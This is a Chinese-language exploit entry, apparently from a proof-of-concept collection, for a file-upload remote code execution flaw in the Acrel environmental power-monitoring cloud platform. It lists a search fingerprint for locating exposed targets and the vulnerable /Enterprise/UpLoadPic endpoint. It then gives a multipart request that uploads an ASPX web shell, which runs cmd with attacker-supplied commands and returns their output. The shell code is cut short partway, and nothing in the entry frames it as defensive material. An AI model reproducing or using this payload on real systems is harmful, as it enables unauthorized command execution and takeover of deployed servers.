# 安科瑞环保用电监管云平台UpLoadPic文件上传致RCE漏洞

- **系统**：安科瑞环保用电监管云平台UpLoadPic文件上传致　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="myCss/phone.css"`
- **请求**：`POST /Enterprise/UpLoadPic HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRDazwgc1…`

**请求体 / payload**
```
------WebKitFormBoundaryRDazwgc1RnTaskmR
Content-Disposition: form-data; name="file"; filename="1.aspx"
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
System.IO.File.Delete(Request.…（脚本共 675 字，完整版见原文）
```
- **预期**：200　|　—